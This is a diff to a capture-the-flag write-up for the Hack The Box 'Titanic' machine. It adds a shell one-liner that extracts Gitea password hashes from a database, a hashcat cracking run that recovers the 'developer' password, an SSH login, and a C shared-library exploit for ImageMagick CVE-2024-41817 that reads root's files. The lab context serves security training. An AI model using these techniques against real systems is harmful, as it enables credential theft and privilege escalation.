@@ -1,4 +1,4 @@
-# Titanic Write-up
+![image](https://github.com/user-attachments/assets/70fa2487-af5a-4dfc-8b58-16aa5cbe7ec9)# Titanic Write-up
 
 <img src="https://labs.hackthebox.com/storage/avatars/eb5942ec56dd9b6feb06dcf8af8aefc6.png" width="200" height="200">
 
@@ -91,11 +91,76 @@ sqlitebrowser
 
 ![image](https://github.com/user-attachments/assets/cc4e3c59-08f5-4824-bcef-0229057b30b3)
 
-`administrator`:`root@titanic.htb`:`cba20ccf927d3ad0567b68161732d3fbca098ce886bbc923b4062a3960d459c08d2dfc063b2406ac9207c980c47c5d017136`
+    sqlite3 database.db "select passwd,salt,name from user" | while read data; do digest=$(echo "$data" | cut -d'|' -f1 | xxd -r -p | base64); salt=$(echo "$data" | cut -d'|' -f2 | xxd -r -p | base64); name=$(echo $data | cut -d'|' -f 3); echo "${name}:sha256:50000:${salt}:${digest}"; done | tee gitea.hashes
 
-`administrator`:`developer@titanic.htb`:`e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56`
+![image](https://github.com/user-attachments/assets/a9e252e0-c0e2-4c04-80f9-47c651ef21a0)
+
+`administrator`:`sha256`:`50000`:`LRSeX70bIM8x2z48aij8mw==`:`y6IMz5J9OtBWe2gWFzLT+8oJjOiGu8kjtAYqOWDUWcCNLfwGOyQGrJIHyYDEfF0BcTY=`
+
+`developer`:`sha256`:`50000`:`i/PjRSt4VE+L7pQA1pNtNA==`:`5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=`
 
 Hashcat
 
+`hashcat gitea.hashes /usr/share/wordlists/rockyou.txt --user`
+    
+    Session..........: hashcat
+    Status...........: Running
+    Hash.Mode........: 10900 (PBKDF2-HMAC-SHA256)
+    Hash.Target......: gitea.hashes
+    Time.Started.....: Sat Feb 22 11:19:03 2025 (21 secs)
+    Time.Estimated...: Sun Feb 23 14:01:35 2025 (1 day, 2 hours)
+    Kernel.Feature...: Pure Kernel
+    Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+    Guess.Queue......: 1/1 (100.00%)
+    Speed.#1.........:      298 H/s (2.90ms) @ Accel:256 Loops:32 Thr:1 Vec:8
+    Recovered........: 0/2 (0.00%) Digests (total), 0/2 (0.00%) Digests (new), 0/2 (0.00%) Salts
+    Progress.........: 6144/28688770 (0.02%)
+    Rejected.........: 0/6144 (0.00%)
+    Restore.Point....: 3072/14344385 (0.02%)
+    Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:544-576
+    Candidate.Engine.: Device Generator
+    Candidates.#1....: adriano -> class08
+    Hardware.Mon.#1..: Util: 79%
+    
+    sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=:25282528
 
+SSH
 
+`developer`:`25282528`
+
+    ssh developer@titanic.htb
+
+![image](https://github.com/user-attachments/assets/1c3f49e2-70b4-425a-8ccb-2ae58a39f6f8)
+
+    find / -writable -type d 2>/dev/null
+
+![image](https://github.com/user-attachments/assets/dc09cd23-fdbb-466a-9694-df5aec98e8ea)
+
+![image](https://github.com/user-attachments/assets/fd13e376-4dc5-442b-935d-c17914022cd1)
+
+![image](https://github.com/user-attachments/assets/bb69e97d-3805-4096-9082-583574a2bdfa)
+
+CVE-2024-41817
+
+https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8
+
+![image](https://github.com/user-attachments/assets/3a07cc08-a5e8-4e5e-9129-41fabf153378)
+
+/opt/app/static/assets/images/
+
+exploit 
+
+    gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
+    #include <stdio.h>
+    #include <stdlib.h>
+    #include <unistd.h>
+    
+    __attribute__((constructor)) void init(){
+        system("cp /root/root.txt root.txt; chmod 754 root.txt");
+        exit(0);
+    }
+    EOF
+
+Get the root flag!
+
+![image](https://github.com/user-attachments/assets/dfb2ea6f-058d-4184-83d8-4aa951fbcc00)
